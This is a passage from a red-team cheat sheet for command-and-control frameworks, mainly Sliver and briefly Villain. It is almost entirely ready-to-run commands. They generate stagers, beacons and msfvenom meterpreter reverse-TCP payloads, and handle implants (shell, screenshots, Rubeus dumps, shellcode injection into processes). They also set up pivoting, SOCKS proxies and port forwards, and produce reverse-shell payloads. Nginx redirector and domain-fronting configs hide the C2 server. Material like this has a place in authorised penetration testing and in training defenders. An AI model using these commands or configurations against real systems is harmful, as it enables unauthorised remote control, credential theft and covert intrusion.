sliver > generate stager --lhost <LHOST> --lport <LPORT> --arch amd64 --format c --save /PATH/TO/BINARY/
```

```console
sliver > profiles new --mtls <LHOST> --os windows --arch amd64 --format shellcode <PROFILE>
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
sliver > generate stager --lhost <LHOST> --lport <LPORT> --protocol http --format c --save /PATH/TO/BINARY/
```

#### Error: rpc error: code = Unknown desc = exit status 1 - Please make sure Metasploit framework >= v6.2 is installed and msfvenom/msfconsole are in your PATH

> https://github.com/BishopFox/sliver/issues/1580

```console
$ msfvenom LHOST=<LHOST> LPORT=<LPORT> -p windows/x64/meterpreter/reverse_tcp -f c -o /PATH/TO/BINARY/stager.c
```

or

```console
$ msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<LHOST> LPORT=<LPORT> LURI=/<NAME>.woff -f raw -o /PATH/TO/BINARY/<FILE>.bin
```

```console
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --prepend-size
```

### Common Commands, Implant and Beacon Handling

```console
sliver > mtls                                                             // Mutual Transport Layer Security
sliver > mtls --lport <LPORT>                                             // set MTLS port
sliver > jobs                                                             // display current jobs
sliver > implants                                                         // show all created implants
sliver > sessions                                                         // display currently available sessions
sliver > sessions -i <ID>                                                 // interact with a session
sliver > use -i <ID>                                                      // interact with a session
sliver > sessions -k <ID>                                                 // kill a session
sliver > upload /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY      // upload a file
sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
sliver (NEARBY_LANGUAGE) > rename -n <NAME>                               // rename beacon
sliver (NEARBY_LANGUAGE) > reconfig -i 30s -j 0s                          // reconfigure beacon
sliver (NEARBY_LANGUAGE) > beacons prune                                  // remove lost beacons
sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
sliver (NEARBY_LANGUAGE) > tasks fetch 49ead4a9                           // fetch a specific task
sliver (NEARBY_LANGUAGE) > info                                           // provide session information
sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell (ctrl + d to get back)
sliver (NEARBY_LANGUAGE) > netstat                                        // get network information
sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
sliver (NEARBY_LANGUAGE) > background                                     // background the session
sliver (NEARBY_LANGUAGE) > seatbelt -- -group=getsystem                   // execute from armory with parameter
sliver (NEARBY_LANGUAGE) > rubeus -- dump /nowrap                         // execute from armory with parameter
sliver (NEARBY_LANGUAGE) > execute-assembly <FILE>.exe uac                // execute a local binary
sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // execute a local binary
```

### Spawning new Sessions

```console
sliver (NEARBY_LANGUAGE) > interactive
sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY/
sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
```

### Port Forwarding

```console
sliver (NEARBY_LANGUAGE) > portfwd
sliver (NEARBY_LANGUAGE) > portfwd add -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add -b 127.0.0.1:<RPORT> -r 127.0.0.1:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd add --bind 127.0.0.1:<RPORT> -r <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > portfwd rm -i <ID>
```

### SOCKS Proxy

```console
sliver (NEARBY_LANGUAGE) > socks5 start
sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
```

### Pivoting

```console
sliver (NEARBY_LANGUAGE) > pivots tcp
sliver (NEARBY_LANGUAGE) > generate --tcp-pivot <RHOST>:<RPORT>
sliver (NEARBY_LANGUAGE) > pivots
```

### Redirector

#### Nginx

##### Basic VHost Configuration

```console
server {
    listen 8443 default_server;
    listen [::]:8443 default_server;

    root /var/www/html;

    index index.html index.htm;

    server_name <DOMAIN>;

    location / {
        try_files $uri $uri/ @c2;
    }

    location @c2 {
        proxy_pass http://<RHOST>:8443;
        proxy_redirect off;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

##### Domain Fronting Configuration

```console
server {
    listen 80;
    listen [::]:80;

    server_name <DOMAIN>;
    return 302 https://$server_name$request_uri;

    location / {
        limit_except GET HEAD POST { deny all; }
    }
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;

    server_name <DOMAIN>;

    ssl_certificate /etc/ssl/certs/<DOMAIN>.pem;
    ssl_certificate_key /etc/ssl/private/<DOMAIN>.pem;

    root /var/www/html/<DOMAIN>;
    index index.html;

    location / {
        limit_except GET HEAD POST { deny all; }
    }
}

server {
    listen 8443 ssl;
    listen [::]:8443 ssl;

    server_name <DOMAIN>;

    root /var/www/html/<DOMAIN>;
    index index.html;

    ssl_certificate /etc/ssl/certs/<DOMAIN>.pem;
    ssl_certificate_key /etc/ssl/private/<DOMAIN>.pem;

    location / {
        try_files $uri $uri/ @c2;
        limit_except GET HEAD POST { deny all; }
    }

    location @c2 {
        proxy_pass http://<RHOST>:8443;
        proxy_redirect off;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

#### Sliver Server Configuration

##### iptables

The `iptables` rules should only accept traffic for port `22/TCP` and from the `redirector`.

```console
$ /sbin/iptables -F
$ /sbin/iptables -P INPUT DROP
$ /sbin/iptables -P OUTPUT ACCEPT
$ /sbin/iptables -I INPUT -i lo -j ACCEPT
$ /sbin/iptables -A INPUT -p tcp --match multiport --dports 22 -j ACCEPT
$ /sbin/iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
$ /sbin/iptables -A INPUT -s <RHOST> -j ACCEPT
$ /sbin/iptables -A INPUT -j DROP
$ /usr/sbin/netfilter-persistent save
$ /usr/sbin/iptables-save > /root/custom-ip-tables-rules
```

##### server.json

```json
{
    "daemon_mode": false,
    "daemon": {
        "host": "127.0.0.1",
        "port": 31337
    },
    "logs": {
        "level": 4,
        "grpc_unary_payloads": false,
        "grpc_stream_payloads": false,
        "tls_key_logger": false
    },
    "jobs": {
        "multiplayer": null
    },
    "watch_tower": null,
    "go_proxy": ""
```

#### Example

Create a `beacon` for the IP address of the `redirector`.

```console
sliver > generate beacon --http <RHOST>:8443 --os windows --arch amd64 --format exe --disable-sgn --seconds 30 --jitter 3 --save /PATH/TO/BINARY/
```

```console
sliver > http --lport 8443
```

## Villain

> https://github.com/t3l3machus/Villain

```console
$ python3 Villain.py -p 8001 -x 8002 -n 8003 -f 8004
```

### Common Commands

```console
Villain > help
Villain > connect
Villain > generate
Villain > siblings
Villain > sessions
Villain > backdoors
Villain > sockets
Villain > shell
Villain > exec
Villain > upload
Villain > alias
Villain > reset
Villain > kill
Villain > id
Villain > clear
Villain > purge
Villain > flee
Villain > exit
```

### Generate Payloads

```console
Villain > generate payload=windows/netcat/powershell_reverse_tcp lhost=<INTERFACE> encode
Villain > generate payload=linux/hoaxshell/sh_curl lhost=<INTERFACE> encode
```
